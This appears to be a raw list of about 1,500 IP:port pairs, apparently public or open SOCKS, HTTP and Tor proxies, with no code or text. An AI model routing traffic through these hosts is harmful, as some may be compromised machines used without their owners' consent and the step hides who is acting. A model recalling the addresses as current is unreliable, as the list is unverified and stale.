103.147.77.66:3125
103.148.178.228:80
103.148.45.167:4145
103.149.162.195:80
103.15.60.23:8080
103.151.140.188:4145
103.151.226.67:5678
103.153.62.53:1080
103.155.54.233:83
103.156.141.214:1080
103.156.17.63:8181
103.159.194.229:5678
103.159.200.3:8080
103.159.220.65:8080
103.160.132.26:83
103.161.164.109:8181
103.163.134.4:8181
103.165.175.71:5678
103.166.39.17:8080
103.166.39.1:8080
103.168.155.159:8080
103.172.70.18:8080
103.175.46.126:1080
103.177.38.5:20005
103.184.94.128:8080
103.19.130.50:8080
103.197.251.202:80
103.206.51.225:84
103.208.200.116:23500
103.209.230.113:8080
103.212.93.225:45639
103.213.118.46:1080
103.216.82.18:6666
103.221.54.113:8080
103.231.78.36:80
103.239.52.191:33427
103.239.52.97:4153
103.241.182.97:80
103.243.114.206:8080
103.243.81.252:30384
103.245.204.214:8080
103.248.119.131:10801
103.250.153.203:8080
103.250.68.10:8080
103.250.73.178:8444
103.253.145.43:61461
103.30.0.249:4145
103.37.82.134:39873
103.4.117.161:8080
103.4.94.178:41350
103.41.212.226:44759
103.42.162.50:8080
103.48.183.113:4145
103.48.68.34:83
103.49.202.252:80
103.5.63.210:40544
103.5.63.211:40544
103.51.18.6:5678
103.53.228.207:9050
103.60.161.2:80
103.68.182.90:8009
103.69.20.38:4145
103.75.184.179:49780
103.75.184.179:51465
103.76.172.230:4153
103.77.41.138:8080
103.78.171.10:83
103.78.210.178:30000
103.79.152.202:5678
103.79.152.204:5678
103.80.118.242:51080
103.80.210.174:5678
103.83.174.95:4145
103.83.232.122:80
103.83.97.238:8080
103.84.134.1:1080
103.85.232.20:1080
103.87.201.135:4145
103.87.212.14:8080
103.87.212.15:4153
103.87.24.34:5678
103.88.238.227:8080
103.90.231.93:40797
103.94.133.90:4153
103.94.133.94:4153
104.131.56.196:7497
104.194.225.108:41354
104.208.74.76:8000
104.208.75.168:8000
104.208.83.99:8000
104.208.97.127:8000
104.208.97.22:8000
104.208.98.217:8000
104.208.99.32:8000
104.208.99.66:8000
104.218.198.168:50223
104.238.96.101:31212
104.248.90.212:80
104.251.94.117:31246
104.37.168.141:80
104.37.99.129:8282
105.213.143.55:5678
105.27.143.174:4153
106.0.48.13:8080
106.14.255.124:80
106.240.89.60:4145
106.245.183.60:4145
106.75.152.112:999
107.152.44.51:50007
109.121.55.162:8888
109.167.134.253:30710
109.167.134.253:44788
109.200.155.195:8080
109.201.96.222:4145
109.233.191.31:8123
109.238.223.67:61150
109.70.189.51:3629
109.73.191.73:5678
109.75.34.152:59341
109.75.42.82:3629
109.86.228.165:5678
109.92.222.170:53281
110.139.125.237:4145
110.164.208.125:8888
110.171.84.180:8080
110.232.86.22:5678
110.235.250.155:1080
110.76.129.106:59570
110.76.129.229:5678
110.77.134.106:8080
110.77.145.159:4145
110.77.232.221:4145
110.78.114.161:8080
110.78.149.20:4145
110.78.164.188:4153
110.78.208.148:8080
110.78.81.107:8080
111.118.140.126:5678
111.221.54.40:5678
111.253.122.110:3629
111.3.118.247:30001
111.42.175.236:9091
111.59.194.52:9091
111.61.73.175:7302
111.68.127.58:4153
111.85.159.65:9091
112.133.215.24:8080
112.49.34.128:9091
112.5.101.162:7300
112.5.101.162:7302
112.51.96.118:9091
112.54.33.47:7302
112.54.47.55:9091
112.78.138.163:5678
112.78.144.62:4145
113.108.247.146:20086
113.11.138.22:5678
113.160.188.21:1080
113.160.247.115:4145
113.161.13.52:5678
113.161.212.130:1080
113.162.84.219:1080
113.252.44.63:80
113.53.247.221:4153
113.53.29.218:33885
113.53.29.88:4145
113.57.84.39:9091
113.57.85.33:49505
114.130.78.185:8080
114.43.125.53:80
114.43.125.82:80
114.43.89.92:80
114.46.122.194:8080
114.5.199.221:80
115.127.162.234:8080
115.127.95.82:8080
115.159.65.66:7302
115.243.238.43:80
115.243.238.45:80
115.96.208.124:8080
116.0.4.54:8080
116.118.48.140:26993
116.118.98.9:5678
116.206.61.179:5678
116.235.137.152:7890
116.58.251.133:80
116.80.41.12:80
117.102.75.171:5678
117.102.89.74:5678
117.102.90.67:5678
117.103.5.142:60113
117.121.213.94:7497
117.4.107.199:51796
117.54.114.100:80
117.54.114.33:80
117.54.114.97:80
117.54.114.98:80
117.54.114.99:80
118.122.194.18:2021
118.163.13.200:8080
118.170.38.56:8888
118.172.187.127:8080
118.172.201.216:8080
118.174.21.117:13629
118.175.244.111:8080
118.212.152.82:9091
118.238.12.55:80
118.31.104.81:80
118.97.114.125:5678
118.97.164.19:8080
118.97.191.233:4153
119.123.243.193:1080
119.179.143.60:8060
119.42.110.113:4145
119.82.251.250:31678
119.91.250.25:6666
119.93.122.233:4145
12.11.59.114:1080
120.202.192.232:9091
120.220.220.95:8085
120.234.223.159:9091
120.237.144.57:9091
120.237.144.77:9091
120.42.224.254:21212
120.50.19.84:8080
120.79.112.57:1284
120.88.34.92:5678
121.139.218.165:31409
121.139.218.165:43295
121.156.109.108:8080
121.4.103.23:32001
122.116.150.2:9000
122.152.55.141:5678
122.154.100.89:5678
122.155.165.191:3128
122.224.56.198:7302
122.252.230.117:7497
122.3.255.114:4145
122.9.101.6:8888
123.183.174.69:7302
123.200.17.107:8080
123.200.20.6:8080
123.200.22.234:4153
123.231.230.58:31196
123.27.171.133:5678
123.31.12.184:28417
123.56.106.161:8888
124.105.55.176:30906
124.107.231.82:1080
124.121.105.172:8080
124.126.18.167:8000
124.131.219.94:9091
124.156.100.105:8118
124.158.186.34:5678
124.16.102.175:4781
124.167.248.230:1080
124.217.251.187:50727
124.225.116.119:7302
124.40.246.21:8080
125.141.133.53:5566
125.141.133.98:5566
125.141.139.197:5566
125.141.139.198:5566
125.228.43.81:8080
125.25.40.37:8080
125.253.125.132:46051
125.27.251.171:36743
125.42.2.148:9091
125.75.127.191:1111
128.199.125.165:43176
128.199.175.145:38186
128.199.196.151:443
128.201.119.251:999
128.90.135.215:8118
128.90.137.102:8118
129.126.65.78:4153
129.146.18.152:20000
129.154.54.178:3128
129.154.54.211:40091
129.154.54.57:3128
129.154.54.75:36187
129.205.138.174:4145
129.205.200.89:47309
129.205.244.158:1080
13.208.211.148:5000
13.208.74.46:5000
13.208.99.150:5000
13.213.144.148:38080
130.185.121.228:50002
132.226.172.129:8101
132.226.229.103:39553
132.226.229.192:15263
133.125.54.107:80
133.130.108.201:8080
134.0.63.134:1723
134.122.58.174:80
134.122.74.46:45678
134.209.105.160:2600
134.209.105.160:47322
134.209.105.160:8282
134.209.189.42:80
134.209.28.98:3128
134.236.242.161:4153
134.249.151.4:54965
135.125.30.135:42625
135.181.140.218:29809
135.181.203.208:80
135.181.79.170:21555
135.181.79.170:47105
135.181.79.170:48544
136.228.131.236:33427
136.232.116.2:48976
136.233.251.156:80
136.233.251.157:80
136.233.51.83:3128
136.243.148.97:25928
136.243.15.179:1080
137.184.100.192:37444
137.74.90.232:8282
137.74.90.233:8282
138.0.207.18:38328
138.0.229.232:4153
138.0.91.227:999
138.117.84.107:999
138.117.84.86:999
138.197.138.160:19641
138.197.138.160:56844
138.197.181.13:7497
138.199.22.85:10811
138.201.125.229:8118
138.201.5.11:1080
138.68.184.18:3128
138.68.245.25:7497
138.94.92.26:7497
139.0.21.236:5678
139.159.48.155:39593
139.162.229.172:80
139.180.146.114:34959
139.180.223.81:26171
139.255.123.3:8080
139.255.19.250:5678
139.255.41.118:8080
139.255.74.125:8080
139.255.97.156:14888
139.5.132.245:8080
139.59.58.141:7497
139.59.66.145:41458
139.59.73.112:54614
139.59.73.112:63689
139.99.201.117:16797
14.140.131.82:3128
14.141.146.102:80
14.161.25.229:5678
14.23.62.59:7300
14.63.1.108:4145
14.99.214.169:5678
140.227.127.205:80
140.227.127.228:80
140.227.211.47:8080
140.227.59.167:3180
140.227.61.156:23456
140.227.69.124:3180
140.227.80.237:3180
140.83.32.175:80
140.83.52.229:8080
141.144.231.209:1080
141.147.46.91:3128
141.164.36.205:54301
141.98.6.239:3128
142.93.113.81:7497
143.137.99.202:5678
143.198.152.50:12345
143.198.242.86:8048
143.198.69.18:12345
143.244.149.59:35887
144.126.217.189:12345
144.217.7.124:35403
144.91.106.93:3128
144.91.123.26:80
145.40.121.101:3128
145.40.121.163:3128
145.40.121.21:3128
146.120.174.149:8989
146.185.218.109:15901
146.190.18.15:8888
146.196.48.2:80
146.56.116.9:3128
146.56.119.252:80
147.135.134.57:9300
147.182.138.62:28434
147.182.228.141:12345
148.77.34.200:54321
149.154.69.203:3080
149.202.164.5:35264
150.109.32.166:80
150.129.201.30:6666
150.230.249.37:22913
150.230.96.150:19291
151.22.181.214:8080
151.22.181.215:8080
151.236.14.178:5678
151.248.16.57:8080
151.80.119.118:1080
151.80.119.118:808
152.200.154.51:999
152.231.25.126:8080
152.231.27.33:60080
152.32.186.145:1080
152.32.78.24:4145
152.67.219.111:3128
152.67.222.187:3128
152.69.221.55:10114
152.70.82.137:8118
153.121.36.194:8118
153.126.179.216:8080
154.117.159.126:5678
154.13.4.76:59394
154.159.243.117:8080
154.236.168.169:1981
154.236.168.179:1976
154.236.168.179:1981
154.236.177.100:1981
154.236.179.233:1981
154.236.184.70:1981
154.236.189.13:1974
154.236.189.18:1981
154.53.59.254:3128
154.61.227.8:64312
154.79.242.178:1686
155.223.64.80:8081
155.254.9.2:36510
156.0.229.194:42692
156.200.116.71:1976
156.200.116.71:1981
156.200.116.73:1981
156.67.107.79:5678
157.119.211.133:8080
157.119.222.186:4145
157.230.8.196:7497
157.245.1.59:47445
157.245.1.59:51438
157.245.140.55:35965
157.245.157.72:60490
157.245.77.149:13288
157.245.77.149:64024
157.245.82.62:2222
158.140.185.64:5678
158.140.190.211:5678
158.255.215.50:16993
158.255.215.50:9090
158.58.133.38:5678
159.192.138.170:8080
159.192.253.73:8080
159.192.97.129:5678
159.197.128.41:3128
159.223.117.140:24006
159.223.228.228:80
159.223.82.90:11553
159.224.243.185:37793
159.65.116.119:30199
159.65.148.165:12383
159.65.246.59:8290
159.65.4.147:7497
159.65.69.186:9300
159.65.95.236:5566
159.69.117.155:42572
159.69.153.169:5566
159.69.204.95:9100
159.89.173.152:49467
159.89.228.253:38172
160.10.27.84:8080
160.16.105.145:8080
160.226.203.247:1080
160.251.44.173:12522
160.251.44.173:45899
160.251.9.62:3128
161.132.123.179:5678
161.22.39.58:999
161.22.39.65:999
161.35.161.38:80
161.97.92.160:80
162.243.140.82:34020
162.243.140.82:35627
162.243.140.82:47982
162.243.140.82:8086
162.243.39.45:46852
162.252.144.161:8282
162.55.186.138:13045
162.55.189.1:13045
163.172.28.169:34256
163.19.52.126:8080
163.53.186.250:5678
163.53.204.178:9813
164.132.170.100:80
164.52.42.6:4145
164.92.205.28:9050
164.92.239.181:3128
164.92.75.10:80
165.154.225.65:80
165.154.226.12:80
165.154.226.242:80
165.154.227.154:25031
165.154.227.188:80
165.154.243.154:80
165.154.243.209:80
165.154.243.252:80
165.154.243.53:80
165.154.46.128:63225
165.154.75.108:3512
165.154.92.12:3512
165.165.159.1:1888
165.227.139.174:16944
165.227.139.174:48453
165.227.187.48:7497
165.227.4.81:7497
165.232.98.39:7497
167.114.173.66:58054
167.172.172.234:37461
167.172.172.234:41915
167.172.178.68:40769
167.172.23.19:33443
167.172.23.19:56289
167.172.96.117:40625
167.172.96.117:43669
167.235.236.41:3128
167.249.29.3:999
167.250.50.101:999
167.86.106.138:7497
167.86.99.193:34990
167.99.182.125:15434
167.99.182.125:26432
167.99.194.95:8048
167.99.201.165:13020
167.99.41.64:3128
168.138.211.5:8080
168.205.218.26:4145
168.227.158.9:4145
168.232.60.242:5678
168.90.15.177:999
169.46.126.192:80
170.231.64.112:5678
170.238.79.2:7497
170.239.255.2:55443
170.247.43.142:32812
170.254.201.14:3180
170.254.201.35:3180
170.78.92.30:5678
170.79.235.3:999
170.83.78.132:999
170.83.79.17:999
171.244.10.204:42018
171.244.140.160:25442
171.244.140.160:38811
171.88.42.180:55050
172.104.115.95:80
172.87.152.122:39593
172.98.161.155:21157
173.212.213.133:3128
173.249.31.157:52305
173.82.252.159:22318
174.139.46.100:58841
174.64.199.79:4145
174.64.199.82:4145
174.75.211.222:4145
174.77.111.196:4145
174.77.111.197:4145
174.77.111.198:49547
175.139.179.65:41527
175.213.188.28:443
175.213.188.28:80
176.101.0.77:41890
176.108.47.38:3128
176.110.121.90:21776
176.115.197.118:8080
176.118.51.82:3629
176.120.32.135:5678
176.192.42.210:1080
176.197.144.158:4153
176.236.141.30:10001
176.236.232.68:9090
176.236.37.132:1080
176.57.189.116:10898
176.74.118.133:5678
176.88.177.197:61080
176.98.22.224:8181
176.98.95.105:30759
176.99.2.43:1081
177.104.16.118:14880
177.104.87.23:5678
177.12.177.21:4153
177.124.184.52:8080
177.128.120.85:5678
177.135.83.242:5678
177.141.99.50:8080
177.184.137.26:80
177.22.203.19:4153
177.223.58.68:48733
177.235.99.234:4145
177.244.33.58:1080
177.54.229.1:9292
177.68.149.122:8080
178.128.173.12:8888
178.128.177.166:7497
178.137.8.193:81
178.150.148.38:8282
178.151.205.154:38421
178.151.205.154:45099
178.168.208.4:5678
178.169.139.180:8080
178.170.54.205:9050
178.212.196.177:9999
178.212.48.70:1080
178.212.54.137:5678
178.212.54.137:8080
178.212.98.200:44550
178.216.24.80:55443
178.218.201.63:1080
178.238.25.174:1337
178.250.70.218:1088
178.253.212.118:1080
178.254.136.51:6666
178.254.158.83:6666
178.33.192.51:25201
178.48.68.61:4145
178.54.21.203:8081
178.62.197.87:80
178.62.202.227:7497
178.62.226.96:51307
178.62.226.96:5555
178.62.231.165:8118
178.72.192.37:5678
179.0.104.101:999
179.1.65.182:999
179.107.53.30:4153
179.109.193.228:4153
179.125.172.210:4153
179.191.12.97:4153
179.27.214.238:4153
180.176.247.122:80
180.180.152.94:4145
180.180.218.250:8080
180.183.156.84:8080
180.210.184.226:8080
180.211.183.2:8080
181.113.135.254:50083
181.115.35.148:5678
181.118.158.38:4153
181.129.138.114:32185
181.129.183.19:53281
181.129.2.90:8081
181.129.49.214:999
181.129.62.2:47377
181.129.74.58:30431
181.129.74.58:40667
181.13.142.45:5678
181.143.21.146:4153
181.143.228.106:35800
181.143.235.100:12345
181.174.85.109:5678
181.205.41.210:7654
181.209.106.189:1080
181.209.106.235:1080
181.209.106.238:1080
181.212.59.189:9812
181.225.54.59:6969
181.229.14.123:5678
181.48.101.245:3128
181.49.217.254:8080
181.57.192.245:999
182.16.171.65:51459
182.23.107.210:3128
182.23.4.130:5678
182.237.16.7:83
182.253.105.42:4145
182.253.140.250:8080
182.253.154.184:5678
182.253.197.69:8080
182.253.7.106:5678
182.61.201.201:80
182.92.77.108:8081
183.111.25.248:8080
183.111.25.250:8080
183.129.190.172:9091
183.131.189.252:7302
183.177.127.42:5678
183.182.102.135:5678
183.239.61.204:9091
183.247.199.215:30001
183.247.221.119:30001
183.250.163.175:9091
183.251.152.214:9091
183.88.210.77:8080
183.88.212.247:1080
183.88.228.208:8080
183.88.240.53:4145
183.88.3.8:8080
184.155.36.194:64312
184.178.172.11:4145
184.178.172.13:15311
184.178.172.14:4145
184.178.172.17:4145
184.178.172.18:15280
184.178.172.23:4145
184.178.172.25:15291
184.178.172.26:4145
184.178.172.28:15294
184.178.172.3:4145
184.178.172.5:15303
184.181.217.194:4145
184.181.217.201:4145
184.181.217.206:4145
184.181.217.210:4145
184.181.217.213:4145
184.181.217.220:4145
184.95.0.122:4153
185.108.140.69:8080
185.108.141.114:8080
185.108.141.49:8080
185.108.141.74:8080
185.118.153.110:8080
185.125.253.130:8080
185.132.1.221:4145
185.132.230.133:5678
185.132.90.169:6789
185.136.151.252:5678
185.138.230.68:5678
185.139.56.133:4145
185.15.172.212:3128
185.150.130.103:808
185.157.241.63:4145
185.157.47.236:1080
185.158.175.111:8080
185.171.54.35:4153
185.172.129.13:7497
185.182.222.178:8080
185.20.115.118:34493
185.200.38.229:10820
185.200.38.235:10820
185.207.205.134:8001
185.208.102.101:1976
185.213.156.226:51971
185.214.187.104:1080
185.219.69.152:80
185.237.10.250:20213
185.242.114.35:9050
185.242.162.87:1080
185.25.119.57:7497
185.3.214.3:80
185.32.6.129:8090
185.32.6.131:8090
185.43.249.148:39316
185.46.217.198:2580
185.47.184.253:45463
185.55.226.108:3128
185.56.180.14:5678
185.6.10.191:19427
185.6.10.248:36627
185.61.152.137:8080
185.64.105.82:9050
185.67.100.105:4153
185.70.187.6:8080
185.72.27.98:8080
185.76.10.133:8081
185.82.238.203:5678
185.87.121.35:8975
185.87.121.5:8975
185.94.218.57:43403
185.95.199.103:1099
185.97.122.253:4153
186.1.206.154:1080
186.119.118.42:8082
186.167.67.98:999
186.201.31.189:4145
186.211.105.202:43573
186.211.8.1:35852
186.24.50.165:4145
186.24.9.114:999
186.248.89.6:5005
186.249.5.10:9090
186.67.192.246:8080
186.97.172.178:60080
187.1.57.206:20183
187.115.10.50:20183
187.115.3.186:5678
187.157.177.18:5678
187.160.75.195:8081
187.177.30.154:4145
187.188.58.134:4153
187.189.75.157:5678
187.243.253.182:43015
187.44.1.248:5678
187.62.86.129:5678
187.85.6.5:5678
187.94.209.246:3128
188.112.39.231:5678
188.132.146.23:1080
188.132.146.90:8080
188.132.152.101:8080
188.132.222.34:8080
188.133.137.9:8081
188.133.157.61:10000
188.133.158.145:8080
188.133.160.22:4145
188.136.162.30:4153
188.138.139.216:4145
188.163.170.130:41209
188.165.201.173:51102
188.165.209.167:7497
188.165.255.116:3128
188.166.17.159:80
188.166.4.251:8118
188.172.151.106:3128
188.18.54.98:8080
188.209.152.183:8080
188.235.0.207:8282
188.235.34.146:1080
188.237.60.27:1080
188.239.72.12:53281
188.241.45.142:2021
188.247.39.14:43032
188.252.14.7:3128
188.32.241.34:81
188.68.231.113:8889
188.75.186.152:4145
188.75.64.38:3128
189.112.223.233:5678
189.16.7.2:4153
189.50.111.164:3629
189.57.119.114:5678
190.0.22.34:61155
190.103.28.187:3128
190.107.146.156:4145
190.107.224.150:3128
190.109.2.87:4145
190.110.99.104:999
190.119.167.154:5678
190.12.95.170:37209
190.121.157.142:999
190.123.226.109:5678
190.14.155.198:5678
190.144.167.178:5678
190.144.224.182:44550
190.145.200.126:53281
190.145.58.106:5678
190.152.151.110:5678
190.196.20.166:44907
190.2.153.31:9050
190.202.111.202:8080
190.202.94.210:8080
190.217.10.12:999
190.248.153.162:8080
190.4.204.163:4145
190.6.54.5:8080
190.61.46.165:999
190.61.61.70:8080
190.82.91.203:999
190.89.89.157:4153
190.90.242.210:999
190.92.72.242:5678
190.96.18.88:5678
191.102.64.147:999
191.102.68.178:999
191.7.85.206:4145
191.97.14.244:999
191.97.14.26:999
191.97.16.110:999
191.97.16.111:999
191.97.16.112:999
191.97.16.113:999
191.97.16.115:999
191.97.16.117:999
191.97.16.118:999
191.97.16.119:999
191.97.19.178:999
192.111.129.145:16894
192.111.130.2:4145
192.111.130.5:17002
192.111.135.17:18302
192.111.135.18:18301
192.111.137.34:18765
192.111.137.35:4145
192.111.137.37:18762
192.111.138.29:4145
192.111.139.162:4145
192.111.139.163:19404
192.111.139.165:4145
192.121.102.186:8118
192.121.102.4:8118
192.169.127.46:443
192.169.127.46:80
192.169.197.17:27350
192.169.197.17:33816
192.169.197.17:46313
192.248.169.126:11956
192.252.208.67:14287
192.252.208.70:14282
192.252.209.155:14455
192.252.211.197:14921
192.252.214.20:15864
192.252.215.5:16137
192.252.220.92:17328
192.9.241.231:19860
192.9.241.51:26568
192.95.29.34:23926
192.95.29.34:54610
193.106.138.52:3128
193.106.57.7:33429
193.106.57.96:5678
193.111.223.200:51327
193.117.138.126:44805
193.169.4.184:10801
193.169.81.91:5678
193.203.61.35:8443
193.253.182.8:80
193.29.63.45:57299
193.41.88.58:53281
194.12.124.188:3629
194.163.187.30:26177
194.28.91.10:5678
194.31.53.250:80
194.33.124.251:5678
194.44.15.222:8081
194.44.172.254:23500
194.5.207.39:3128
194.8.145.174:5678
195.123.220.212:40031
195.135.240.116:8081
195.135.240.203:8081
195.135.242.141:8081
195.138.65.34:5678
195.138.90.226:3128
195.140.226.244:8080
195.15.240.27:1080
195.168.10.9:25952
195.175.49.66:8080
195.178.56.33:8080
195.178.56.35:8080
195.178.56.37:8080
195.201.225.104:12085
195.201.225.104:23224
195.205.123.246:8080
195.210.172.43:58350
195.228.65.164:5678
195.248.240.65:8080
195.31.137.5:80
195.8.52.243:8080
196.20.12.1:8080
196.20.12.29:8080
196.20.21.82:8080
196.202.210.65:8080
196.202.215.143:41890
196.202.215.143:5678
196.207.16.22:8080
196.216.65.57:8080
196.219.202.74:8080
196.3.97.71:23500
196.3.97.71:5678
196.3.99.162:8080
197.210.217.66:60896
197.231.205.96:5678
197.232.21.22:58253
197.232.36.85:41890
197.232.39.208:65238
197.232.47.102:52567
197.232.65.40:55443
197.248.184.158:53281
197.248.222.77:8080
197.248.249.147:5678
197.82.166.158:1080
198.211.38.45:47457
198.229.231.13:8080
198.59.191.234:8080
198.8.94.170:4145
198.8.94.174:39078
198.90.78.212:5678
2.137.22.252:4153
2.139.2.212:4145
2.179.193.146:80
2.188.164.194:8080
2.56.62.76:3128
20.110.214.83:80
20.111.52.84:8000
20.111.54.16:80
20.111.54.16:8123
20.111.61.10:8000
20.111.62.189:8000
20.113.136.195:8000
20.113.137.1:8000
20.113.143.102:8000
20.113.143.34:8000
20.113.151.89:8000
20.113.172.183:8000
20.113.182.164:8000
20.113.60.36:8000
20.119.204.44:8000
20.16.90.78:8000
20.163.80.88:8000
20.187.69.80:8000
20.187.70.249:8000
20.187.84.29:8000
20.205.37.243:1080
20.205.41.88:8000
20.205.42.232:8000
20.205.43.55:8000
20.205.98.104:8000
20.206.101.1:8000
20.206.102.27:8000
20.206.106.192:8123
20.206.121.30:8000
20.206.121.84:8000
20.206.74.12:8000
20.206.76.177:8000
20.206.77.232:8000
20.206.77.24:8000
20.206.78.197:8000
20.206.96.77:8000
20.206.98.174:8000
20.206.98.71:8000
20.210.103.34:8000
20.228.217.236:8000
20.230.175.193:8080
20.239.2.157:80
20.239.53.82:8000
20.239.85.167:8000
20.239.86.234:8000
20.24.72.149:8000
20.24.75.68:8000
20.25.167.141:8000
20.68.122.191:8000
20.7.175.75:8000
20.71.241.197:80
20.77.252.146:8000
20.77.252.14:8000
20.77.253.35:8000
20.77.255.14:8000
20.77.73.85:8000
20.89.153.119:8000
20.89.156.119:8000
20.89.60.252:8000
200.0.247.82:4153
200.0.247.83:4153
200.0.247.86:4153
200.108.196.108:4145
200.111.182.6:443
200.118.122.6:4153
200.152.100.194:1080
200.16.68.111:7497
200.172.255.195:8080
200.181.51.41:5678
200.25.254.193:54240
200.32.80.50:999
200.41.182.243:4145
200.46.203.42:5678
200.54.22.74:80
200.54.22.74:8080
200.54.28.123:5678
200.58.76.160:5678
200.6.175.10:59341
200.69.74.166:6996
200.8.188.25:999
200.8.190.45:999
200.85.169.18:50577
200.85.198.9:999
201.157.254.26:8080
201.158.120.44:45504
201.18.91.34:4153
201.184.152.138:44742
201.184.230.34:5678
201.206.141.102:6969
201.217.51.9:4145
201.219.194.202:8080
201.220.112.98:999
201.221.134.74:5678
201.222.125.37:7497
201.222.45.64:999
201.222.45.65:999
201.222.45.66:999
201.222.45.67:999
201.222.45.68:999
201.222.45.69:999
201.222.45.7:999
201.234.24.1:4153
201.234.24.89:4153
201.234.24.9:4153
201.236.248.250:5678
201.238.248.134:443
201.48.62.65:4145
201.71.2.131:999
201.71.2.41:999
201.71.2.97:999
201.90.171.253:4153
201.91.82.155:3128
202.131.159.58:5678
202.163.72.74:4153
202.164.37.34:8080
202.165.47.90:55443
202.166.164.115:5678
202.169.35.90:4145
202.180.23.42:4153
202.182.57.10:8080
202.21.103.6:5678
202.21.112.172:1080
202.29.218.138:4153
202.40.188.92:40486
202.51.189.134:4145
202.53.171.114:80
202.6.227.174:3888
202.6.233.59:7878
202.62.60.57:4145
202.70.84.201:4153
202.72.209.3:44550
202.79.40.97:36953
202.85.197.139:80
203.112.223.126:8080
203.115.106.174:5678
203.150.113.249:14153
203.150.128.111:8080
203.150.128.188:8080
203.150.172.151:8080
203.153.36.37:7497
203.156.190.5:5678
203.202.253.186:58309
203.205.29.108:5678
203.205.34.58:5678
203.243.63.16:80
203.89.126.250:80
203.98.76.64:5678
204.10.182.34:39593
206.189.140.176:21657
206.189.158.86:443
206.189.200.62:13110
206.62.64.34:8080
207.180.193.106:9100
207.180.235.41:9300
207.200.138.35:5678
207.244.254.30:32850
208.100.20.136:80
208.102.51.6:58208
208.115.210.152:11527
209.141.56.216:10898
210.16.73.80:1080
210.16.73.82:1080
210.16.73.83:1080
210.211.122.40:36080
210.221.124.147:1080
210.245.51.76:4145
211.132.18.237:8081
211.161.103.139:9091
211.207.170.169:8118
211.234.125.3:443
211.234.125.5:443
212.115.232.79:10800
212.115.232.79:31280
212.126.108.181:5678
212.129.54.138:3128
212.154.82.52:9090
212.174.242.114:8080
212.174.44.22:1080
212.174.44.59:8085
212.186.125.121:5678
212.3.187.188:8080
212.34.239.253:1080
212.39.74.207:8080
212.47.228.149:57323
212.79.107.116:5678
212.95.180.50:53281
213.136.69.153:63791
213.14.137.38:808
213.14.174.70:3128
213.16.81.182:35559
213.163.126.100:5678
213.172.89.227:4153
213.197.64.16:5678
213.212.210.252:1981
213.214.74.90:80
213.222.34.200:53281
213.226.11.149:41878
213.226.11.149:59086
213.251.238.26:8080
213.32.252.134:5678
213.33.249.214:3128
213.6.66.66:57391
213.7.196.26:4153
213.89.48.95:1080
213.92.217.174:5678
213.97.98.89:4153
216.154.201.132:54321
216.155.89.66:999
217.160.241.42:3128
217.169.220.183:6666
217.180.218.36:8080
217.219.247.115:8080
217.219.28.117:3128
217.60.194.47:8080
217.91.37.151:4153
218.1.142.10:57114
218.1.142.112:57114
218.1.142.134:57114
218.1.142.147:57114
218.1.142.159:57114
218.1.142.95:57114
218.1.200.141:57114
218.1.200.232:57114
218.1.200.93:57114
218.158.46.197:808
218.252.244.104:80
218.60.2.245:1080
218.75.38.154:9091
218.92.231.164:1080
219.78.228.211:80
220.87.121.155:80
221.131.175.29:9091
221.133.9.35:4004
221.178.239.200:7302
221.6.215.202:9091
222.111.184.59:80
222.124.193.113:8080
222.124.34.196:5678
222.129.39.73:8118
222.158.214.161:3128
222.186.133.44:53335
222.237.249.172:8080
222.237.73.160:3128
222.252.21.100:5678
223.100.241.162:7302
223.223.198.206:7003
223.75.134.66:9091
223.93.157.211:9091
223.96.90.216:8085
23.94.73.246:1080
24.106.221.230:53281
24.172.82.94:53281
24.249.199.12:4145
24.249.199.4:4145
24.37.245.42:51056
27.159.66.41:20070
27.204.235.99:21212
27.46.54.128:9797
27.72.122.228:51067
27.72.145.184:5678
3.131.207.170:13343
31.131.67.14:8080
31.177.15.3:5678
31.207.191.125:5678
31.41.84.40:1099
31.41.90.142:1080
31.42.57.1:8080
31.43.203.100:1080
31.43.52.176:41890
31.44.82.182:5678
34.110.251.255:80
35.158.228.86:17777
35.178.238.246:80
35.233.233.190:25000
35.233.238.154:25000
35.244.6.175:1080
36.231.69.104:80
36.37.104.98:34040
36.66.215.119:8080
36.67.27.189:49524
36.67.45.71:1080
36.67.88.77:4153
36.71.8.15:4153
36.92.70.209:8080
36.92.81.181:4145
36.92.9.75:49420
36.95.122.51:5678
36.95.231.205:5678
36.95.84.151:41890
37.18.73.60:5566
37.186.5.16:5678
37.187.133.177:55243
37.187.133.177:55254
37.187.133.177:55448
37.187.133.177:55462
37.187.133.177:55605
37.187.133.177:55667
37.187.133.177:56447
37.187.133.177:56943
37.187.133.177:57323
37.193.40.16:1080
37.228.65.107:51032
37.235.24.194:3128
37.32.40.178:8080
37.57.15.43:33761
37.57.40.167:4145
37.98.218.137:5678
37.99.224.225:7497
38.10.69.101:9090
38.10.69.109:9090
38.41.0.89:999
38.41.0.91:999
38.41.0.92:999
38.41.0.94:999
38.41.53.144:9090
38.41.53.145:9090
39.108.102.73:5100
39.152.104.167:7302
40.122.224.41:8000
40.71.183.93:443
41.139.147.86:5678
41.174.132.82:5678
41.178.6.118:8060
41.215.85.74:8080
41.220.114.154:8080
41.220.238.130:83
41.223.234.116:37259
41.242.66.74:5678
41.33.63.182:1981
41.60.216.119:23500
41.60.233.66:34098
41.60.235.41:8080
41.60.237.35:8080
41.65.163.86:1981
41.65.174.120:1976
41.65.174.120:1981
41.65.227.168:1981
41.65.236.35:1981
41.65.236.37:1976
41.65.236.37:1981
41.65.236.44:1976
41.65.236.44:1981
41.65.236.48:1976
41.65.236.48:1981
41.65.236.53:1976
41.65.236.56:1976
41.65.236.56:1981
41.65.236.57:1981
41.65.236.58:1981
41.65.251.86:1981
41.72.203.182:42928
41.79.10.218:4673
41.79.9.246:3128
41.84.135.102:8080
41.89.162.100:4673
42.2.189.238:80
42.228.61.245:9091
43.128.36.71:3389
43.129.207.123:3001
43.135.154.94:21127
43.135.74.226:38081
43.228.95.138:5678
43.229.72.192:8000
43.240.113.88:44818
43.240.113.88:46868
43.245.217.254:5678
43.248.25.6:4145
45.114.39.25:8080
45.120.216.98:12345
45.14.224.32:62104
45.14.224.32:64155
45.14.50.53:8080
45.148.121.228:443
45.148.145.30:443
45.156.176.1:4153
45.158.15.124:443
45.160.15.1:999
45.161.115.141:999
45.161.115.250:999
45.166.144.2:999
45.167.126.249:9992
45.169.148.11:999
45.169.70.9:7497
45.170.102.1:999
45.179.184.121:8083
45.179.184.6:8083
45.179.228.112:1080
45.181.122.169:999
45.181.122.74:999
45.182.141.112:999
45.185.6.35:7497
45.191.105.189:1080
45.224.197.137:4145
45.225.184.145:999
45.225.184.177:999
45.228.147.209:5678
45.229.192.61:5678
45.230.168.17:999
45.230.47.17:999
45.234.67.62:5678
